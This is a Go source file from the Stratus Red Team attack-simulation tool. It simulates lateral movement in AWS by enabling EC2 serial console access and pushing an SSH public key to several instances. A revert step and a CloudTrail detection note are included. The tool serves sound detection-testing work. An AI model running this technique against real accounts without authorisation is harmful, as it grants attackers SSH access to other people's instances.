package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2instanceconnect"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"strconv"
	"strings"
	"time"
)

//go:embed my_key.pub
var publicSSHKey string

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.lateral-movement.ec2-serial-console-send-ssh-public-key",
		FriendlyName: "Usage of EC2 Serial Console to push SSH public key",
		IsSlow:       true,
		Description: `
Simulates an attacker using EC2 Instance Connect to push an SSH public key to multiple EC2 instances, using <code>SendSerialConsoleSSHPublicKey</code>. This allows anyone 
with the corresponding private key to connect directly to the systems via SSH, assuming they have appropriate network connectivity.

Warm-up:

- Create multiple EC2 instances and a VPC (takes a few minutes).

Detonation:

- Adds a public SSH key to the EC2 instances using <code>SendSerialConsoleSSHPublicKey</code>.

References:

- https://docs.aws.amazon.com/ec2-instance-connect/latest/APIReference/API_SendSerialConsoleSSHPublicKey.html
- https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud
- https://fwdcloudsec.org/assets/presentations/2024/europe/sebastian-walla-cloud-conscious-tactics-techniques-and-procedures-an-overview.pdf
- https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/
- https://unit42.paloaltonetworks.com/cloud-virtual-machine-attack-vectors/
`,
		Detection: `
Identify, through CloudTrail's <code>SendSerialConsoleSSHPublicKey</code> event, when a user is adding an SSH key to EC2 instances.
`,
		Platform:                   stratus.AWS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.LateralMovement},
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	ec2instanceconnectClient := ec2instanceconnect.NewFromConfig(providers.AWS().GetConnection())
	instanceIDs := strings.Split(params["instance_ids"], ",")

	// Enable serial console access
	log.Println("Enabling serial console access at the region level")
	if err := setSerialConsoleEnabled(ec2Client, true); err != nil {
		return fmt.Errorf("failed to disable serial console access: %v", err)
	}

	log.Println("Sending SSH public key to " + strconv.Itoa(len(instanceIDs)) + " EC2 instances via serial console")
	for _, instanceID := range instanceIDs {
		cleanInstanceID := strings.Trim(instanceID, " \"\n\r")
		err := sendSerialConsoleSSHPublicKey(ec2instanceconnectClient, cleanInstanceID, publicSSHKey)
		if err != nil {
			if strings.Contains(err.Error(), "SerialConsoleSessionLimitExceededException") {
				log.Printf("Serial console session limit exceeded for instance %s. Retrying after waiting 60s...", cleanInstanceID)
				time.Sleep(60 * time.Second)
				err = sendSerialConsoleSSHPublicKey(ec2instanceconnectClient, cleanInstanceID, publicSSHKey)
			}
			if err != nil {
				return fmt.Errorf("failed to send SSH public key via serial console to instance %s: %v", cleanInstanceID, err)
			}
		}

		log.Printf("SSH public key successfully added to instance %s via serial console", cleanInstanceID)
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// Serial console access was already enabled before running Stratus Red Team. Nothing to do
	if params["serial_console_access_initial_value"] == "true" {
		log.Println("Serial console access was already enabled before running Stratus Red Team. Keeping it enabled")
		return nil
	}

	// Serial console access was disabled before running Stratus Red Team. Since the detonation enabled it,
	// and it's a region-wide setting, we now need to revert it back to its original value (false)
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	log.Println("Serial console access was disabled before running Stratus Red Team. Disabling it again.")
	if err := setSerialConsoleEnabled(ec2Client, false); err != nil {
		return fmt.Errorf("failed to disable serial console access: %v", err)
	}

	return nil
}

// Utility functions
func sendSerialConsoleSSHPublicKey(ec2instanceconnectClient *ec2instanceconnect.Client, instanceId string, sshPublicKey string) error {
	_, err := ec2instanceconnectClient.SendSerialConsoleSSHPublicKey(context.Background(), &ec2instanceconnect.SendSerialConsoleSSHPublicKeyInput{
		InstanceId:   &instanceId,
		SSHPublicKey: &sshPublicKey,
	})

	return err
}

func setSerialConsoleEnabled(ec2Client *ec2.Client, enabled bool) error {
	if enabled {
		_, err := ec2Client.EnableSerialConsoleAccess(context.Background(), &ec2.EnableSerialConsoleAccessInput{})
		return err
	} else {
		_, err := ec2Client.DisableSerialConsoleAccess(context.Background(), &ec2.DisableSerialConsoleAccessInput{})
		return err
	}
}
